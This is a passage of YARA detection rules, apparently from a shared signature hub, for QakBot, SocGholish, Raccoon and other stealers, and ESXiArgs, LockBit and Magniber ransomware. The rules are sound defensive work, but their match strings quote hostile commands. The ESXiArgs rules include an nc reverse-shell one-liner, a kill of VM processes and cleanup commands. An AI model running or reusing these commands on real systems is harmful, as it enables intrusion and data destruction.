      yarahub_reference_md5 = "ff19670725eaf5df6f3d2ca656d3db27"
      yarahub_uuid = "211e3eac-1acf-45af-bac9-e0a4c353560c"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.qakbot"

   strings:

    $y = "noitcnuf" nocase
    $z = "BEGIN CERTIFICATE REQUEST" nocase

    condition:
    $y and $z and filesize < 20000

}
rule QBOT_HTMLSmuggling_a {

  meta:
      author = "Ankit Anubhav - ankitanubhav.info"
      description = "Detects QBOT HTML smuggling variants"
      date = "2022-06-26"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "1807f10ee386d0702bbfcd1a4da76fd1"
      yarahub_uuid = "8db8aecd-53ae-4772-8d9c-38b121cfe0e0"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.qakbot"

   strings:
       $x = "html"
       $y = "UEsDB"
       $z = "atob("
       $c1 = "viewport"
       $c2 = "initial-scale=1"
       $escaped = { 5c 78 36 44 5c 78 37 33 5c 78 35 33 5c 78 36 31 5c 78 37 36 5c 78 36 35 5c 78 34 46 5c 78 37 32 5c 78 34 46 5c 78 37 30 5c 78 36 35 5c 78 36 45 5c 78 34 32 5c 78 36 43 5c 78 36 46 5c 78 36 32 }
       $normal = "msSaveOrOpenBlob"
       $qbot26092022 = { 2e 7a 69 70 3c 2f 62 3e }
       $qbotmagic = "VUVzREJC"
       $qbotmagic_reversed = "CJERzVUV"
       $obama211 = "IHImERWP"
    condition:
       ($x and $y and $z and (($c1 and $c2) or $qbot26092022 ) and ($escaped or $normal)) or ($x and ($qbotmagic or $qbotmagic_reversed or $obama211))  and filesize > 500
}
rule RABBITHUNT_cls {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "d7c6a7d6-20d9-40d0-a63c-2c780bee821e"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "22a968beda8a033eb31ae175b7e0a937"
  strings:
    $a = "k_3872.cls"
    $b = "c_2910.cls"
    $c = "MataNet"
    $d = { 76 55 82 F6 93 82 B2 C7 77 15 13 3E 72 80 D4 DD }
    $e = { 72 82 EE F1 F2 8F C2 72 87 99 A8 2A AA C7 44 79 }
  condition:
    any of them
}rule RABBITHUNT_loader {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "a0476975-9fb5-410e-90be-1a4acd6398e3"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "22a968beda8a033eb31ae175b7e0a937"
  strings:
        $a = "kernel32.dll:LoadLibraryA"
        $b = "kernel32.dll:VirtualFree"
        $c = "kernel32.dll:VirtualAlloc"
        $d = "kernel32.dll:UnmapViewOfFile"
        $e = "kernel32.dll:GetFileAttributesW"
        $f = "kernel32.dll:GetFileSize"
        $g = "kernel32.dll:MapViewOfFile"
        $h = "kernel32.dll:CloseHandle"
        $i = "kernel32.dll:CreateFileW"
        $j = "kernel32.dll:CreateFileMappingW"
        
  condition:
    any of them
}rule RaccoonV2 : loader stealer
{
    meta:
        author                    = "@_FirehaK <yara@firehak.com>"
        date                      = "2022-06-04"
        description               = "Detects Raccoon Stealer version 2.0 (called Recordbreaker before attribution)."
        malpedia_family           = "win.recordbreaker"
        modified                  = "2022-10-23"
        reference                 = "https://www.zerofox.com/blog/brief-raccoon-stealer-version-2-0/"
        yarahub_author_twitter    = "@_FirehaK"
        yarahub_author_email      = "yara@firehak.com"
        yarahub_reference_link    = "https://www.zerofox.com/blog/brief-raccoon-stealer-version-2-0/"
        yarahub_reference_md5     = "b35cde0ed02bf71f1a87721d09746f7b"
        yarahub_uuid              = "817722f6-fe01-4772-b432-adb7b0c3a5ec"
        yarahub_license           = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"

    strings:
        $get_username = { 6802020000 6a40 c745fc01010000 (ff15??????00|ffd0) 8bf0 8d45fc 50 56 ff15??????00 8bc6 5e c9 c3 }
        $to_wide_char = { 8d145d10000000 52 6a40 (ff15??????00|ffd6) 53 8bf0 56 6aff 57 6a00 68e9fd0000 ff15 }
        $x1 = { 6878ff0000 6a40 8bf1 (ff15??????00|ffd0) 8b16 8bc8 e8???????? ba???????? 8bc8 e8???????? ba???????? 8bc8 5e e9 }
        $x2 = { ff15??????00 85ff 75?? 57 ff15??????00 8b45?? 40 8945?? 83f805 7c?? eb }
        $x3 = { 6808020000 6a40 (ff15??????00|ffd0) 8b55e4 8bc8 e8???????? 8b15???????? 8bc8 e8???????? 8b7df4 8bc8 8bd7 e8???????? ba??????00 8bc8 e8???????? 8b0d???????? 8b }
        $x4 = { 6808020000 6a40 (ff15??????00|ffd1) 6a00 6a1a 50 6a00 8945?? ff15??????00 8bce e8???????? 85c0 74 }
        $x5 = { 85c9 74?? 0fb73c30 6685ff 74?? 66893e 83c602 49 83ea01 75?? 5f 33c9 b87a000780 }
        $xor_c2 = { 8bc8 33d2 8b45fc f7f1 8a0e 8b45fc 328a???????? 40 880c33 46 8945fc 83f840 72 }
        $xor_str = { 8bc8 33d2 8bc3 f7f1 8b45f8 8a0c02 8d1433 8b45fc 8a0410 32c1 43 8802 3bdf 72 }

    condition:
        uint16(0) == 0x5a4d
        and 3 of them
}rule RANSOM_ESXiArgs_Ransomware_Bash_Feb23
{
    meta:
	author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
	description = "Detects the ESXiArgs Ransomware encryption bash script"
	reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
	date = "2023-02-07"
	tlp = "CLEAR"
	yarahub_reference_md5 = "d0d36f169f1458806053aae482af5010"
	yarahub_uuid = "4498d57f-44ec-47f2-8455-ceeacd3dc07e"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_author_twitter = "@SI_FalconTeam"

    strings:
	$bash = "#!/bin/sh"
	
	$wait = "Waiting for task' completion..."

	$comment0 = "## SSH HI"
	$comment1 = "## CHANGE CONFIG"
	$comment2 = "## STOP VMX"
	
	$kill0 = "echo \"KILL VMX\""
	$kill1 = "kill -9 $(ps | grep vmx | awk '{print $2}')"
	
	$index = "$path_to_ui/index1.html"

	$ext0 = ".vmdk" 
	$ext1 = ".vmx"
	$ext2 = ".vmxf"
	$ext3 = ".vmsd"
	$ext4 = ".vmsn"
	$ext5 = ".vswp"
	$ext6 = ".vmss"
	$ext7 = ".nvram"
	$ext8 = ".vmem"

	$clean0 ="/bin/rm -f $CLEAN_DIR\"encrypt\" $CLEAN_DIR\"nohup.out\" $CLEAN_DIR\"index.html\" $CLEAN_DIR\"motd\" $CLEAN_DIR\"public.pem\" $CLEAN_DIR\"archieve.zip\""
	$clean1 = "/bin/echo '' > /etc/rc.local.d/local.sh"

    condition:
	$bash
	and $wait
	and any of ($comment*)
	and 2 of ($kill*)
	and $index
	and 4 of ($ext*)
	and 2 of ($clean*)
}rule RANSOM_ESXiArgs_Ransomware_Encryptor_Feb23
{
    meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects the ESXiArgs Ransomware 'encrypt' binary"
		reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
		date = "2023-02-07"
		tlp = "CLEAR"
        yarahub_reference_md5 = "87b010bc90cd7dd776fb42ea5b3f85d3"
		yarahub_uuid = "5eed9fd1-410e-4d38-a355-d89617398785"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		// Sosemanuk Pseudo-Random Number Generator
        $sosemanuk_prng = {48 8b 45 f8 48 01 45 e0 48 8b 45 f8 48 29 45 d8 48 8b 45 e8 8b 90 80 00 00 00 48 8b 45 f8 01 c2 48 8b 45 e8 89 90 80 00 00 00}
        
        // Sosemanuk Multiplication Tables
        // based on Findcrypt3 rule https://github.com/polymorf/findcrypt-yara/blob/ad165a6b2bd5b56932657b96edffa851b5b00b15/findcrypt3.rules#L1522
        $sosemanuk_mul_a = {00 00 00 00 13 CF 9F E1 26 37 97 6B 35 F8 08 8A [992] DE 4D 5B B5 CD 82 C4 54 F8 7A CC DE EB B5 53 3F}
        $sosemanuk_mul_ia = {00 00 00 00 CD 40 0F 18 33 80 1E 30 FE C0 11 28 [992] 1C 65 E2 9E D1 25 ED 86 2F E5 FC AE E2 A5 F3 B6}

        $interpreter = "/lib64/ld-linux-x86-64.so.2"

        $debug0 = "encrypt_bytes: too big data"
        $debug1 = "Progress: %f"

        $help = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]"

    condition:
        uint32be(0x0) == 0x7F454C46
        and all of ($sosemanuk_*)
        and $interpreter
        and 2 of ($debug*)
        and $help
}






rule RANSOM_ESXiArgs_Ransomware_Python_Feb23
{
    meta:
	author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
	description = "Detects the ESXiArgs Ransomware encryption python script"
	reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
	date = "2023-02-07"
	tlp = "CLEAR"
	yarahub_reference_md5 = "c358fe0e8837cc577315fc38892b937d"
	yarahub_uuid = "e79d0764-bf61-4e71-b181-8ed13edfcb98"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_author_twitter = "@SI_FalconTeam"

    strings:
	$python = "#!/bin/python"
	$desc = "This module starts debug tools"

	$command0 = "server_namespace"
	$command1 = "service_instance"
	$command2 = "local"
	$command3 = "operation_id"
	$command4 = "envelope"

	$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
	$OpenSLPPort = "port = '427'"
	$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

    condition:
	$python
	and $desc
	and 4 of ($command*)
	and $cmd
	and $OpenSLPPort
	and $listener
}import "pe"
import "math"
import "console"

rule RANSOM_Lockbit_Black_Packer : Ransomware {

   meta:
      author = "SECUINFRA Falcon Team"
      description = "Detects the packer used by Lockbit Black (Version 3)"
      reference = "https://twitter.com/vxunderground/status/1543661557883740161"
      date = "2022-07-04"
      tlp = "WHITE"
      yarahub_uuid = "de99eca0-9502-4942-a30a-b3f9303953e3"
      yarahub_reference_md5 = "38745539b71cf201bb502437f891d799"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      yarahub_author_twitter = "@SI_FalconTeam"
      hash0 = "80e8defa5377018b093b5b90de0f2957f7062144c83a09a56bba1fe4eda932ce"
      hash1 = "506f3b12853375a1fbbf85c82ddf13341cf941c5acd4a39a51d6addf145a7a51"
      hash2 = "d61af007f6c792b8fb6c677143b7d0e2533394e28c50737588e40da475c040ee"

   strings:
      $sectionname0 = ".rdata$zzzdbg" ascii
      $sectionname1 = ".xyz" ascii fullword
      
      // hash checks
      $check0 = {3d 75 80 91 76 ?? ?? 3d 1b a4 04 00 ?? ?? 3d 9b b4 84 0b}
      $check1 = {3d 75 ba 0e 64}
      
      // hex/ascii calculations
      $asciiCalc = {66 83 f8 41 ?? ?? 66 83 f8 46 ?? ?? 66 83 e8 37}
      
   condition:
      uint16(0) == 0x5a4d
      and filesize > 111KB // Size on Disk/1.5
      and filesize < 270KB // Size of Image*1.5
      and all of ($sectionname*)
      and any of ($check*)
      and $asciiCalc
      and for any i in (0..pe.number_of_sections - 1): 
      (math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) > 7.9
      and (pe.sections[i].name == ".text" or pe.sections[i].name == ".data" or pe.sections[i].name == ".pdata")//)
      // console requires Yara 4.2.0. For older versions uncomment closing bracket above und comment out the line below
      and console.log("High Entropy section found:", pe.sections[i].name))
}
rule RANSOM_Magniber_ISO_Jan23
{
	meta:
		author = "SECUINFRA Falcon Team"
		description = "Detects Magniber Ransomware ISO files from fake Windows Update delivery method"
		reference = "https://twitter.com/SI_FalconTeam/status/1613540054382559234"
		date = "2023-01-13"
		tlp = "CLEAR"
		hash = "4dcbcc070e7e3d0696c777b63e185406e3042de835b734fe7bb33cc12e539bf6"
		yarahub_uuid = "19686301-e651-4bfe-b295-712a90f3156c"
        yarahub_reference_md5 = "fedb6673626b89a9ee414a5eb642a9d9"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$magic = {43 44 30 30 31} // CD001 ISO Magic
		$tool = {55 4C 54 52 41 49 53 4F 00 39 2E 37 2E 36 2E 33 38 32 39} // "ULTRAISO.9.7.6.3829"

		$msiMagic = {D0 CF 11 E0 A1 B1 1A E1}
		$dosString = "!This program cannot be run in DOS mode" ascii // To "exclude" Office files which also use $msiMagic
		$lnkMagic = {4C 00 00 00}

	condition:
		filesize > 200KB 
		and filesize < 800KB 
		and all of them
}rule RANSOM_Magniber_LNK_Jan23
{
	meta:
		author = "SECUINFRA Falcon Team"
		description = "Detects Magniber Ransomware LNK files from fake Windows Update delivery method"
		reference = "https://twitter.com/SI_FalconTeam/status/1613540054382559234"
		date = "2023-01-13"
		tlp = "CLEAR"
		hash = "16ecec4efa2174dec11f6a295779f905c8f593ab5cc96ae0f5249dc50469841c"
		yarahub_uuid = "ceee9545-c008-41d8-bc2f-513e78209d21"
        yarahub_reference_md5 = "fedb6673626b89a9ee414a5eb642a9d9"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$netbiosName = "victim1" ascii fullword
		$macAddress = {00 0C 29 07 E1 6D}
	
	condition:
		uint32be(0x0) == 0x4C000000 
		and all of them
}import "pe"

rule recordbreaker_win_generic
{
	meta:
		author = "_kphi"
		date = "2022-09-10"
		yarahub_uuid = "29b92b37-a135-4ca0-beeb-ef8401ed458f"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "38edeba93cc729b7099d74a7780d4dd6"

	strings:
		$a1 = "GetEnvironmentVariable"
		$a2 = "GetLogicalDriveStrings"
		$a3 = "GetSystemWow64Directory"
		$a4 = "GlobalMemoryStatusEx"
		$a5 = "DeleteFile"
		$a6 = "FindFirstFile"
		$a7 = "FindNextFile"
		$a8 = "CreateToolhelp32Snapshot"
		$a9 = "OpenProcess"
		$a10 = "Process32First"
		$a11 = "Process32Next"
		$a12 = "SetCurrentDirectory"
		$a13 = "SetEnvironmentVariable"
		$a14 = "WriteFile"
		$a15 = "ShellExecute"
		$a16 = "CreateProcessWithToken"
		$a17 = "DuplicateTokenEx"
		$a18 = "OpenProcessToken"
		$a19 = "SystemFunction036"
		$a20 = "EnumDisplayDevices"
		$a21 = "GetDesktopWindow"
		$a22 = "CryptStringToBinary"
		$a23 = "CryptStringToBinary"
		$a24 = "CryptBinaryToString"
		$a25 = "CryptUnprotectData"
		$a26 = "InternetConnect"
		$a27 = "InternetOpen"
		$a28 = "InternetSetOption"
		$a29 = "InternetOpenUrl"
		$a30 = "InternetOpenUrl"
		$a31 = "InternetReadFileEx"
		$a32 = "InternetReadFile"
		$a33 = "InternetCloseHandle"
		$a34 = "HttpOpenRequest"
		$a35 = "HttpSendRequest"
		$a36 = "HttpQueryInfo"
		$a37 = "HttpQueryInfo"

		$b1 = "GetProcAddress"
		$b2 = "LoadLibraryW"

		$c1 = "ffcookies.txt" wide
		$c2 = "wallet.dat" wide
		
	condition:
		uint16(0) == 0x5A4D
		and 30 of ($a*)
		and any of ($b*)
		and any of ($c*)
}
import "pe"

rule redline_win_generic
{
	meta:
		author = "_kphi"
		date = "2022-09-10"
		yarahub_uuid = "1172c6d1-7066-4ff1-9d48-c040981d43d4"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "3fdf448f17f65a9677f6597c807060f1"

	strings:
		$a = "GetCurrentProcessId"
		$b = "GetCurrentProcessorNumber"
		$c = "GetCurrentThread"
		$d = "GetCurrentThreadId"
		$e = "GetPriorityClass"
		$f = "GetThreadPriority"
		$g = "TerminateProcess"
		$h = "VirtualProtect"

	condition:
		uint16(0) == 0x5A4D
		and pe.sections[4].name == ".bss"
		and all of them
}
rule SelfExtractingRAR {
  meta:
    author = "Xavier Mertens"
    description = "Detects an SFX archive with automatic script execution"
    date = "2023-05-17"
    yarahub_author_twitter = "@xme"
    yarahub_author_email = "xmertens@isc.sans.edu"
    yarahub_reference_link = "https://isc.sans.edu/diary/rss/29852"
    yarahub_uuid = "bcc4ceab-0249-43af-8d2a-8a04d5c65c70"
    yarahub_license =  "CC0 1.0"
    yarahub_rule_matching_tlp =  "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5= "7792250c87624329163817277531a5ef" 

    strings:
        $exeHeader = "MZ"
        $rarHeader = "Rar!" wide ascii
        $sfxSignature = "SFX" wide ascii
        $sfxSetup = "Setup=" wide ascii

    condition:
       $exeHeader at 0 and $rarHeader and $sfxSignature and $sfxSetup
}
rule sfx_pdb_winrar_restrict {

   meta:
      author = "@razvialex"
      description = "Detect interesting files containing sfx with pdb paths."
      date = "2022-07-12"
      yarahub_author_twitter = "@razvialex"
      yarahub_reference_md5 = "826108ccdfa62079420f7d8036244133"
      yarahub_uuid = "8835c09d-0b29-4892-8c68-fd520de87bd6"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"

   strings:
      $var1 = {0D786FA11A6028825A871437B4A067DF66AD67D833A5F938FE6EC930FD51CEF76D711BE7F24D203888A458DFC627FBFCAC32B8D15C96EC7722BB84E4A718812C4BB7A76563E2E43413E3A98A8AE4BA7DBA019CDBF07B3D4434E69B3C6DBC46D120ABB2F78192F0674CFEF4AA8EC682B5EA7C3F995610AA1C2B60F1BA730EC29BF769CFDE5AED1FA0A2479888B08F149C38AAE726B742E5}
      $var2 = "E<ul><li>Press <b>Install</b> button to start extraction.</li><br><br>E<ul><li>Press <b>Extract</b> button to start extraction.</li><br><br>6<li>Use <b>Browse</b> button to select the destination4folder fr" nocase ascii wide
      $var3 = {7E2024732572D181F9B8E4AE05150740623B7A4F5DA4CE3341E24F6D6D0F21F23356E55613C12597D7EB2884EB96D3773B491EAE2D1F472038AD96D1CEFA8ADBCDDE4E86C06855A15D69B2893C122471457D100000411C274A176E57AE62ECAA8922EFDDFBA2B6E4EFE117F2BD66338088B4373E2CB8BF91DEAC190864F4D44E6AFF350E6A}
      $var4 = {294424600F28F0660F6E5C241C660FFEF4660F6ED10F28C6660F6ECA660FEFC5660F62CA0F28E0660F72D00C660F72F414660FEFE0660F6E44242C660F62D80F28442460660F62D9660FFEDF660F6EF8660FFEDC660FEFC30F295C24500F28D8660F72D008660F72F318660FEFD80F28D3660F70DB39660FFED6}
      $var5 = {374DC673D0676DEA06A89B51F8F203C4A2E152A03A2310D7A9738544BAD912CF031887709B3ADC52E852B2E54EFB17072FA64DBEE1D7AB0A4FED628C7BECB9CE214066D4008315A1E675E3CCF2292F848100000000E4177764FBF5D3713D76A0E92F147D664CF4332EF1B8F38E0D0F1369944C73A80F26}
      $var6 = "lo haya hecho.\"\x0D\n\x0D\n; Dialog STARTDLG\x0D\n\x0D\n\x0D\n:DIALOG STARTDLG\x0D\n\x0D\nSIZE   " nocase ascii wide
      $winrar = "name=\"WinRAR SFX\"\x0D\n  type=\"win32\"/>\x0D\n<description>WinRAR SFX modu" nocase ascii
      $pdb = "Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" nocase ascii
      
   condition:
      $winrar and $pdb and 5 of ($var*) and filesize < 3MB 
}rule SocGholish_Custom_Base64 {

  meta:
      author = "Ankit Anubhav -ankitanubhav.info"
      description = "Detects custom base64 used by SocGholish"
      date = "2022-08-02"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "28b01b187ecb0bdc1301da975b52a2fa"
      yarahub_uuid = "10fcd711-8af7-432e-89a7-ae3c109c7dc2"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "js.fakeupdates"

   strings:
       $x = "&15)<<4)|("
       $y = { 69 6e 64 65 78 4f 66 28 ?? ?? 2e 63 68 61 72 41 74 28 ?? ?? 2b 2b 29 }
       $z = "ABCD"
    condition:
       $x and #y == 4 and (not $z) and filesize > 500 and filesize < 3000



}
rule SocGholish_Obfuscated {

  meta:
      author = "Ankit Anubhav -ankitanubhav.info"
      description = "Detects reverse obfuscated socgholish string"
      date = "2022-06-25"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav/status/1540395958428504064"
      yarahub_reference_md5 = "7fb296f96e098bdaaaa518c2ba176ece"
      yarahub_uuid = "e32059b3-f685-42a7-9f45-1d977046611a"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "js.fakeupdates"

   strings:
       $x = { 70 ?? 74 ?? 74 ?? 68 }
       $y = { 67 ?? 6e ?? 70 ?? 2e [1-3] 6c ?? 65 ?? 78 ?? 69 ?? 70 }
       $z = { 66 ?? 69 ?? 67 ?? 2e ?? 31 ?? 78 ?? 31 }
    condition:
       $x and ($y or $z)  and filesize > 500 and filesize < 3000



}
rule SocGholish_Variant_B {

  meta:
      author = "Ankit Anubhav -ankitanubhav.info"
      description = "Detects SocGholish obfuscated variant first observed in July 2022"
      date = "2022-07-19"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav/status/1549246034831781888"
      yarahub_reference_md5 = "4fcc9569ca63cb2f5777954ac4c9290f"
      yarahub_uuid = "df3d194a-c6bc-4440-bad9-461e0e7962fd"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "js.fakeupdates"

   strings:
       $x = { 3d 3d }
       $y = { 66 75 6e 63 74 69 6f 6e }
       $z = { 72 65 74 75 72 6e }
    
    condition:
       (#x > 200 and #x < 500)  and (#y > 200 and #y < 270) and (#z > 180 and #z < 190) and filesize > 37000 and filesize < 42000



}
rule sqlcmd_loader {
    meta:
        author = "@luc4m"
        date = "2023-03-26"
        hash_md5 = "6ffbbca108cfe838ca7138e381df210d"
        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
        tlp = "WHITE"
	yarahub_uuid = "06196d3f-f414-4d87-9fe4-5dd40682f89f"
        yarahub_license =  "CC0 1.0"
        yarahub_rule_matching_tlp =  "TLP:WHITE"
        yarahub_rule_sharing_tlp =  "TLP:WHITE"
        yarahub_reference_md5= "6ffbbca108cfe838ca7138e381df210d" 
    strings:
        $trait_0 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 ec 04 00 00}
        $trait_1 = {85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 04 00 00}
        $trait_2 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 7d 04 00 00}
        $trait_3 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 5b 04 00 00}
        $trait_4 = {6a 20 59 2b d9 03 f1 03 d1 3b d9 0f 83 5f fb ff ff}
        $trait_5 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 e3 03 00 00}
        $trait_6 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 c1 03 00 00}
        $trait_7 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 03 00 00}
        $trait_8 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 4c 03 00 00}
        $trait_9 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 2a 03 00 00}

 $str_0 = /debug[0-9]{1,3}\.ps1/i wide
 $str_1 = "%s\\\\sysnative\\\\%s" wide
 $str_2 = "/c \\\"powershell " wide
 $str_3 = "%s/ab%d.exe" wide 
 $str_4 = "%s/ab%d.php" wide 

    condition:
        (5 of ($trait_*)) and (3 of ($str_*))
}

import "pe"

rule StrelaStealer {
	meta:
        author = "@hackNpatch@infosec.exchange"
        date = "2022-11-11"
        yarahub_author_twitter = "@hackpatch"
        yarahub_reference_sha256 = "8b0d8651e035fcc91c39b3260c871342d1652c97b37c86f07a561828b652e907"
		yarahub_reference_md5 = "57EC0F7CF124D1AE3B73E643A6AC1DAD"        
		yarahub_reference_link = "https://medium.com/@DCSO_CyTec/shortandmalicious-strelastealer-aims-for-mail-credentials-a4c3e78c8abc"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_uuid = "9dbbc74b-fdf0-475f-a2df-0478ab5299e1"

	strings:
		$pdbstring = "C:\\Users\\Serhii\\Documents\\Visual Studio 2008\\Projects\\StrelaDLLCompile\\Release\\StrelaDLLCompile.pdb"
	
	condition:
		pe.DLL
		and pe.number_of_exports == 1
		and ($pdbstring or pe.exports("s") or pe.exports("Strela"))

}rule SUSP_Doc_WordXMLRels_May22 {
   meta:
      description = "Detects a suspicious pattern in docx document.xml.rels file as seen in CVE-2022-30190 / Follina exploitation"
      author = "Tobias Michalski, Christian Burkard, Wojciech Cieslak"
      date = "2022-05-30"
      yarahub_reference_md5 = "5f15a9b76ad6ba5229cb427ad7c7a4f6"
      yarahub_uuid = "a9aad367-682e-440c-8732-dc414274b5c3"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
	  techniques = "File and Directory"
      modified = "2022-06-02"
      reference = "https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e"
      hash = "62f262d180a5a48f89be19369a8425bec596bc6a02ed23100424930791ae3df0"
      score = 70
   strings:
      $a1 = "<Relationships" ascii
      $a2 = "TargetMode=\"External\"" ascii

      $x1 = ".html!" ascii
      $x2 = ".htm!" ascii
   condition:
      filesize < 50KB
      and all of ($a*)
      and 1 of ($x*)
}

import "pe"

rule SUSP_HxD_Icon_Anomaly_May23_1 {
   meta:
      description = "Detects suspicious use of the the free hex editor HxD's icon in PE files that don't seem to be a legitimate version of HxD"
      author = "Florian Roth"
      reference = "https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios"

      date = "2023-05-30"
      yarahub_uuid = "b70e448c-b1c3-4edd-a109-e9bc5122a2ab"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      yarahub_reference_md5 = "21e13f2cb269defeae5e1d09887d47bb"

   strings:
      /* part of the icon bitmap : we're not using resource hashes etc because YARA's string matching is much faster */
      $ac1 = { 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80
               99 00 77 0D DD 09 99 80 99 00 77 0D D0 99 98 09
               99 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 09
               99 99 00 0D D0 99 98 0F F9 99 00 0D D0 99 98 09
               9F 99 00 0D D0 99 98 09 FF 99 00 0D D0 99 98 09
               FF 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 0F
               F9 99 00 0D D0 99 98 09 99 99 00 0D 09 99 80 9F
               F9 99 99 00 09 99 80 99 F9 99 99 00 09 99 80 FF }
